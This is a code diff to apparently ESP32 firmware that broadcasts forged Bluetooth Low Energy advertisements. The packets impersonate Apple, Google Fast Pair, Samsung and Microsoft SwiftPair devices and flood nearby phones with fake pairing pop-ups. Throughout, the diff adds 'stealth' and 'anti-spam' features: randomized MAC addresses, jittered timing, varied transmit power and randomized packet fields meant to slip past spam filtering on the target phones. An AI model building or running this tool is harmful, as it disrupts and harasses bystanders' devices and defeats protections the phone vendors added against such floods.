@@ -57,26 +57,41 @@ struct DeviceType {
     uint32_t value;
 };
 
-const DeviceType android_models[] = {
-    {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}
+const uint32_t enhanced_models[] = {
+    0xCD8256, 0x0000F0, 0xF00000, 0x821F66, 0xF52494,
+    0xAABBCC, 0x112233, 0x445566, 0x778899, 0x99AABB,
+    0xCCDDEE, 0xFF1122, 0x334455, 0x667788, 0x8899AA,
+    0xBBCCDD, 0xEEFF11, 0x223344, 0x556677, 0x889900
 };
 
-int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));
+const int ENHANCED_MODEL_COUNT = sizeof(enhanced_models) / sizeof(enhanced_models[0]);
+
+static uint32_t packet_counter = 0;
+static int64_t last_packet_time = 0;
+static int stealth_mode_counter = 0;
 BLEAdvertising *pAdvertising;
 
-void generateRandomMac(uint8_t *mac) {
-    mac[0] = 0x02 | (random(256) & 0xFC);
+void generateAntiSpamMac(uint8_t *mac) {
+    uint32_t r1 = esp_random();
+    uint32_t r2 = (uint32_t)esp_timer_get_time();
+    uint32_t r3 = packet_counter;
+    uint32_t seed = r1 ^ (r2 << 16) ^ (r3 << 8);
+    srand(seed);
+    
+    mac[0] = 0x02 | (rand() & 0xFC);
     for (int i = 1; i < 6; i++) {
-        mac[i] = random(256);
+        mac[i] = rand() % 256;
     }
+    mac[0] &= 0xFE;
+    mac[0] |= 0x02;
 }
 
 const char *generateRandomName() {
-    static char randomName[10];
+    static char randomName[12];
     const char *charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-    int len = random(5) + 3;
+    int len = 5 + (packet_counter % 6);
     for (int i = 0; i < len; ++i) {
-        randomName[i] = charset[random(26)];
+        randomName[i] = charset[esp_random() % 26];
     }
     randomName[len] = '\0';
     return randomName;
@@ -88,8 +103,9 @@ void hexStringToBytes(const char* hexString, uint8_t* output, size_t outputLengt
     }
 }
 
-uint8_t* createApplePacket(uint8_t deviceType, bool isContinuity = false) {
+uint8_t* createEnhancedApplePacket(uint8_t deviceType, bool isContinuity = false) {
     static uint8_t packet[31];
+    uint32_t timestamp = (uint32_t)(esp_timer_get_time() / 1000);
     
     if(isContinuity) {
         uint8_t continuity_base[] = {
@@ -99,18 +115,105 @@ uint8_t* createApplePacket(uint8_t deviceType, bool isContinuity = false) {
             0x00, 0x00
         };
         memcpy(packet, continuity_base, 23);
-        memset(packet + 23, 0, 8);
+        
+        int battery = 5 + (packet_counter % 20) * 5;
+        packet[14] = 0x60;
+        packet[15] = battery * 0x64 / 100;
+        packet[16] = (timestamp >> 8) & 0xFF;
+        packet[17] = timestamp & 0xFF;
+        
+        memset(packet + 18, 0, 5);
         return packet;
     } else {
+        uint8_t random_hash[6];
+        for(int i = 0; i < 6; i++) {
+            random_hash[i] = esp_random() & 0xFF;
+        }
+        
         uint8_t device_base[] = {
             0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, deviceType,
-            0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-            0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+            random_hash[0], random_hash[1], random_hash[2],
+            random_hash[3], random_hash[4], random_hash[5],
+            0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00
         };
+        
+        bool connected = (packet_counter % 7) == 0;
+        int battery = 10 + ((packet_counter * 7) % 91);
+        
+        device_base[9] = 0x20 | (connected ? 0x10 : 0x00);
+        device_base[10] = (timestamp >> 8) & 0xFF;
+        device_base[11] = battery * 0x64 / 100;
+        device_base[12] = packet_counter & 0xFF;
+        
         memcpy(packet, device_base, 31);
         return packet;
     }
+}
+
+int calculateRealisticDelay(EBLEPayloadType type) {
+    int baseDelay;
+    int variation = 0;
+    
+    switch(type) {
+        case AppleIOS:
+            baseDelay = 30;
+            variation = random(5, 25);
+            break;
+        case GoogleFastPair:
+            baseDelay = 60;
+            variation = random(10, 40);
+            break;
+        case Microsoft:
+            baseDelay = 35;
+            variation = random(5, 20);
+            break;
+        case SamsungAll:
+            baseDelay = 40;
+            variation = random(5, 25);
+            break;
+        case NameFlood:
+            baseDelay = 15;
+            variation = random(3, 12);
+            break;
+        default:
+            baseDelay = 30;
+            variation = random(5, 15);
+    }
+    
+    variation += (packet_counter % 15) * 2;
+    return baseDelay + variation;
+}
+
+BLEAdvertisementData getEnhancedFastPairData() {
+    BLEAdvertisementData AdvData = BLEAdvertisementData();
+    
+    static int fastpair_counter = 0;
+    fastpair_counter++;
+    
+    uint32_t model = enhanced_models[fastpair_counter % ENHANCED_MODEL_COUNT];
+    int8_t rssi = -70 + (fastpair_counter % 41);
+    
+    uint8_t Google_Data[16] = {
+        0x03, 0x03, 0x2C, 0xFE, 
+        0x08, 0x16, 0x2C, 0xFE,
+        (uint8_t)((model >> 0x10) & 0xFF),
+        (uint8_t)((model >> 0x08) & 0xFF),
+        (uint8_t)((model >> 0x00) & 0xFF),
+        0x02, 0x0A, 
+        (uint8_t)rssi,
+        (uint8_t)(fastpair_counter & 0xFF),
+        0x00
+    };
+    
+#ifdef NIMBLE_V2_PLUS
+    AdvData.addData(Google_Data, 16);
+#else
+    AdvData.addData(std::string((char*)Google_Data, 16));
+#endif
+    
+    return AdvData;
 }
 
 BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int specific_index = -1) {
@@ -120,25 +223,33 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
         case AppleIOS: {
             static int deviceIndex = 0;
             static bool useDevicePacket = true;
+            static int continuityCounter = 0;
             
             if(useDevicePacket) {
-                uint8_t deviceTypes[] = {0x02, 0x0E, 0x0A, 0x13, 0x14, 0x03, 0x0B, 0x0C, 0x11, 0x10};
-                uint8_t* packet = createApplePacket(deviceTypes[deviceIndex % 10], false);
+                uint8_t deviceTypes[] = {0x02, 0x0E, 0x0A, 0x13, 0x14, 0x03, 0x0B, 0x0C, 0x11, 0x10, 0x01, 0x06, 0x20, 0x15};
+                uint8_t* packet = createEnhancedApplePacket(deviceTypes[deviceIndex % 14], false);
 #ifdef NIMBLE_V2_PLUS
                 AdvData.addData(packet, 31);
 #else
                 AdvData.addData(std::string((char*)packet, 31));
 #endif
                 deviceIndex++;
+                
+                uint8_t extra_data[] = {0x02, 0x01, 0x06, 0x03, 0x03, 0x12, 0x18};
+#ifdef NIMBLE_V2_PLUS
+                AdvData.addData(extra_data, sizeof(extra_data));
+#else
+                AdvData.addData(std::string((char*)extra_data, sizeof(extra_data)));
+#endif
             } else {
-                uint8_t continuityTypes[] = {0x01, 0x06, 0x20, 0xC0, 0x0D, 0x13};
-                uint8_t* packet = createApplePacket(continuityTypes[deviceIndex % 6], true);
+                uint8_t continuityTypes[] = {0x01, 0x06, 0x20, 0xC0, 0x0D, 0x13, 0x12, 0x0F};
+                uint8_t* packet = createEnhancedApplePacket(continuityTypes[continuityCounter % 8], true);
 #ifdef NIMBLE_V2_PLUS
                 AdvData.addData(packet, 23);
 #else
                 AdvData.addData(std::string((char*)packet, 23));
 #endif
-                deviceIndex++;
+                continuityCounter++;
             }
             useDevicePacket = !useDevicePacket;
             break;
@@ -185,7 +296,6 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
 #else
             AdvData.addData(std::string((char *)AdvData_Raw, i));
 #endif
-            
             break;
         }
         
@@ -232,22 +342,9 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
             break;
         }
         
-        case GoogleFastPair: {
-            const uint32_t model = android_models[random(android_models_count)].value;
-            uint8_t Google_Data[14] = {
-                0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE,
-                (uint8_t)((model >> 0x10) & 0xFF),
-                (uint8_t)((model >> 0x08) & 0xFF),
-                (uint8_t)((model >> 0x00) & 0xFF),
-                0x02, 0x0A, (uint8_t)((random(120)) - 100)
-            };
-#ifdef NIMBLE_V2_PLUS
-            AdvData.addData(Google_Data, 14);
-#else
-            AdvData.addData(std::string((char*)Google_Data, 14));
-#endif
+        case GoogleFastPair:
+            AdvData = getEnhancedFastPairData();
             break;
-        }
         
         case CustomName: {
             break;
@@ -286,47 +383,119 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
     return AdvData;
 }
 
-void executeSpam(EBLEPayloadType type, int delayMs = 6, int specific_index = -1) {
+void executeEnhancedSpam(EBLEPayloadType type) {
     uint8_t macAddr[6];
-    generateRandomMac(macAddr);
-    esp_base_mac_addr_set(macAddr);
+    generateAntiSpamMac(macAddr);
+    
+    int actualDelay = calculateRealisticDelay(type);
+    
+    if(last_packet_time > 0) {
+        int64_t time_since_last = (esp_timer_get_time() - last_packet_time) / 1000;
+        if(time_since_last < 5) {
+            vTaskDelay((10 - time_since_last) / portTICK_PERIOD_MS);
+        }
+    }
     
     BLEDevice::init("");
-    vTaskDelay(1 / portTICK_PERIOD_MS);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
+    vTaskDelay(3 / portTICK_PERIOD_MS);
+    
+    int8_t tx_power_variation = (packet_counter % 5) - 2;
+    esp_pwr_lvl_t actual_power = (esp_pwr_lvl_t)(MAX_TX_POWER + tx_power_variation);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, actual_power);
     
     pAdvertising = BLEDevice::getAdvertising();
-    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type, specific_index);
+    pAdvertising->setDeviceAddress(BLEAddress(macAddr, BLE_ADDR_RANDOM));
     
-    uint32_t random_uuid = random() & 0xFFFF;
-    char uuid_str[10];
-    snprintf(uuid_str, sizeof(uuid_str), "%04X", random_uuid);
-    String full_uuid = String("0000") + uuid_str + "-0000-1000-8000-00805f9b34fb";
-    pAdvertising->addServiceUUID(BLEUUID(full_uuid.c_str()));
+    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
+    
+    BLEAdvertisementData scanResponse = BLEAdvertisementData();
+    if(random(100) < 70) {
+        char local_name[16];
+        snprintf(local_name, sizeof(local_name), "Device_%04X", esp_random() & 0xFFFF);
+        scanResponse.setName(local_name);
+        
+        uint32_t service_uuid = 0xFE95 + (packet_counter % 0x100);
+        char uuid_str[40];
+        snprintf(uuid_str, sizeof(uuid_str), "0000%04X-0000-1000-8000-00805f9b34fb", service_uuid);
+        scanResponse.addServiceUUID(BLEUUID(uuid_str));
+    }
+    pAdvertising->setScanResponseData(scanResponse);
     
     pAdvertising->setAdvertisementData(advertisementData);
-    pAdvertising->start();
-    vTaskDelay(delayMs / portTICK_PERIOD_MS);
-    pAdvertising->stop();
-    vTaskDelay(1 / portTICK_PERIOD_MS);
     
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-    esp_bt_controller_deinit();
-#else
-    BLEDevice::deinit(true);
-#endif
+    if(type == AppleIOS || type == GoogleFastPair) {
+        pAdvertising->setMinInterval(32);
+        pAdvertising->setMaxInterval(48);
+    }
+    
+    pAdvertising->start();
+    vTaskDelay(actualDelay / portTICK_PERIOD_MS);
+    pAdvertising->stop();
+    
+    int cleanup_delay = 2 + (packet_counter % 4);
+    vTaskDelay(cleanup_delay / portTICK_PERIOD_MS);
+    
+    BLEDevice::deinit(false);
+    
+    packet_counter++;
+    last_packet_time = esp_timer_get_time();
+    
+    if((packet_counter % 50) == 0) {
+        vTaskDelay(100 / portTICK_PERIOD_MS);
+    }
+}
+
+void executeStealthSpam(EBLEPayloadType type) {
+    switch(stealth_mode_counter % 4) {
+        case 0:
+            executeEnhancedSpam(type);
+            break;
+        case 1: {
+            uint8_t macAddr[6];
+            generateAntiSpamMac(macAddr);
+            BLEDevice::init("");
+            esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_N12);
+            
+            pAdvertising = BLEDevice::getAdvertising();
+            pAdvertising->setDeviceAddress(BLEAddress(macAddr, BLE_ADDR_RANDOM));
+            
+            BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
+            pAdvertising->setAdvertisementData(advertisementData);
+            pAdvertising->start();
+            vTaskDelay(15 / portTICK_PERIOD_MS);
+            pAdvertising->stop();
+            BLEDevice::deinit(false);
+            
+            packet_counter++;
+            last_packet_time = esp_timer_get_time();
+            break;
+        }
+        case 2:
+            for(int i = 0; i < 3; i++) {
+                executeEnhancedSpam(type);
+                vTaskDelay(5 / portTICK_PERIOD_MS);
+            }
+            vTaskDelay(80 / portTICK_PERIOD_MS);
+            break;
+        case 3:
+            vTaskDelay(60 / portTICK_PERIOD_MS);
+            break;
+    }
+    
+    stealth_mode_counter++;
 }
 
 void executeCustomSpam(String spamName) {
     uint8_t macAddr[6];
-    generateRandomMac(macAddr);
-    esp_base_mac_addr_set(macAddr);
+    generateAntiSpamMac(macAddr);
     
     BLEDevice::init("");
-    vTaskDelay(1 / portTICK_PERIOD_MS);
+    vTaskDelay(3 / portTICK_PERIOD_MS);
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
     
     pAdvertising = BLEDevice::getAdvertising();
+    pAdvertising->setDeviceAddress(BLEAddress(macAddr, BLE_ADDR_RANDOM));
+    
     BLEAdvertisementData advertisementData = BLEAdvertisementData();
     advertisementData.setFlags(0x06);
     advertisementData.setName(spamName.c_str());
@@ -335,19 +504,17 @@ void executeCustomSpam(String spamName) {
     char service_str[10];
     snprintf(service_str, sizeof(service_str), "%04X", service_id);
     String service_uuid = String("0000") + service_str + "-0000-1000-8000-00805f9b34fb";
-    pAdvertising->addServiceUUID(BLEUUID(service_uuid.c_str()));
+    advertisementData.setCompleteServices(BLEUUID(service_uuid.c_str()));
     
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->start();
-    vTaskDelay(6 / portTICK_PERIOD_MS);
+    vTaskDelay(25 / portTICK_PERIOD_MS);
     pAdvertising->stop();
-    vTaskDelay(1 / portTICK_PERIOD_MS);
+    vTaskDelay(2 / portTICK_PERIOD_MS);
     
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-    esp_bt_controller_deinit();
-#else
-    BLEDevice::deinit(true);
-#endif
+    BLEDevice::deinit(false);
+    packet_counter++;
+    last_packet_time = esp_timer_get_time();
 }
 
 void aj_adv(int ble_choice) {
@@ -355,42 +522,66 @@ void aj_adv(int ble_choice) {
     int count = 0;
     String spamName = "";
     static int spam_all_index = 0;
-    static int samsung_slow_counter = 0;
     
     if (ble_choice == 5) { spamName = keyboard("", 10, "Name to spam"); }
     timer = millis();
     
     while (1) {
-        if (millis() - timer > (ble_choice == 6 ? 3 : (ble_choice == 2 ? 30 : 10))) {
+        if (millis() - timer > 25) {
+            bool use_stealth = ((count % 15) >= 10);
+            
             switch (ble_choice) {
                 case 0:
                     displayTextLine("Apple iOS (" + String(count) + ")");
-                    executeSpam(AppleIOS, 6);
+                    if(use_stealth) {
+                        executeStealthSpam(AppleIOS);
+                    } else {
+                        executeEnhancedSpam(AppleIOS);
+                    }
                     break;
                 case 1:
                     displayTextLine("SwiftPair (" + String(count) + ")");
-                    executeSpam(Microsoft, 6);
+                    if(use_stealth) {
+                        executeStealthSpam(Microsoft);
+                    } else {
+                        executeEnhancedSpam(Microsoft);
+                    }
                     break;
                 case 2:
                     displayTextLine("Samsung (" + String(count) + ")");
-                    if(samsung_slow_counter % 3 == 0) {
-                        executeSpam(SamsungAll, 20);
+                    if(use_stealth) {
+                        executeStealthSpam(SamsungAll);
                     } else {
-                        vTaskDelay(20 / portTICK_PERIOD_MS);
+                        executeEnhancedSpam(SamsungAll);
                     }
-                    samsung_slow_counter++;
                     break;
                 case 3:
                     displayTextLine("FastPair (" + String(count) + ")");
-                    executeSpam(GoogleFastPair, 6);
+                    if(use_stealth) {
+                        executeStealthSpam(GoogleFastPair);
+                    } else {
+                        executeEnhancedSpam(GoogleFastPair);
+                    }
                     break;
                 case 4:
                     displayTextLine("Spam All (" + String(count) + ")");
                     switch(spam_all_index % 4) {
-                        case 0: executeSpam(AppleIOS, 15); break;
-                        case 1: executeSpam(SamsungAll, 25); break;
-                        case 2: executeSpam(Microsoft, 15); break;
-                        case 3: executeSpam(GoogleFastPair, 15); break;
+                        case 0: 
+                            if(use_stealth) executeStealthSpam(AppleIOS);
+                            else executeEnhancedSpam(AppleIOS);
+                            break;
+                        case 1: 
+                            if(use_stealth) executeStealthSpam(SamsungAll);
+                            else executeEnhancedSpam(SamsungAll);
+                            break;
+                        case 2: 
+                            if(use_stealth) executeStealthSpam(Microsoft);
+                            else executeEnhancedSpam(Microsoft);
+                            break;
+                        case 3: 
+                            if(use_stealth) executeStealthSpam(GoogleFastPair);
+                            else executeEnhancedSpam(GoogleFastPair);
+                            break;
                     }
                     spam_all_index++;
                     break;
@@ -400,7 +591,11 @@ void aj_adv(int ble_choice) {
                     break;
                 case 6:
                     displayTextLine("Name Flood (" + String(count) + ")");
-                    executeSpam(NameFlood, 3);
+                    if(use_stealth) {
+                        executeStealthSpam(NameFlood);
+                    } else {
+                        executeEnhancedSpam(NameFlood);
+                    }
                     break;
             }
             count++;
@@ -408,18 +603,18 @@ void aj_adv(int ble_choice) {
         }
 
         if (check(EscPress)) {
+            if(pAdvertising != nullptr) {
+                pAdvertising->stop();
+                vTaskDelay(10 / portTICK_PERIOD_MS);
+            }
+            BLEDevice::deinit(true);
+            vTaskDelay(50 / portTICK_PERIOD_MS);
             returnToMenu = true;
             break;
         }
     }
-
-    BLEDevice::init("");
-    vTaskDelay(30 / portTICK_PERIOD_MS);
-    pAdvertising = nullptr;
-    vTaskDelay(30 / portTICK_PERIOD_MS);
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-    esp_bt_controller_deinit();
-#else
-    BLEDevice::deinit(true);
-#endif
+    
+    packet_counter = 0;
+    last_packet_time = 0;
+    stealth_mode_counter = 0;
 }
